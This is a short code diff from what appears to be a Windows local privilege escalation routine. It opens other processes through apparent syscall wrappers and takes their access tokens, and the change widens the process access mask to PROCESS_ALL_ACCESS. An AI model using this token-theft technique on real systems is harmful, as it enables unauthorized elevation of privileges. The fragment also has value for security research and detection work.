@@ -194,7 +194,7 @@ void SFLocalPrivilege() {
         clientId.UniqueProcess = processInfo->UniqueProcessId;
         clientId.UniqueThread = NULL;
         InitializeObjectAttributes(&objectAttributes, NULL, 0, NULL, NULL);
-        status = SFNtOpenProcess(&hTokenProcess, MAXIMUM_ALLOWED, &objectAttributes, &clientId);
+        status = SFNtOpenProcess(&hTokenProcess, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);
         if (hTokenProcess != 0xcccccccccccccccc && hTokenProcess != 0) {
             hToken = 0xcccccccccccccccc;
             status = SFNtOpenProcessToken(hTokenProcess, MAXIMUM_ALLOWED, &hToken);
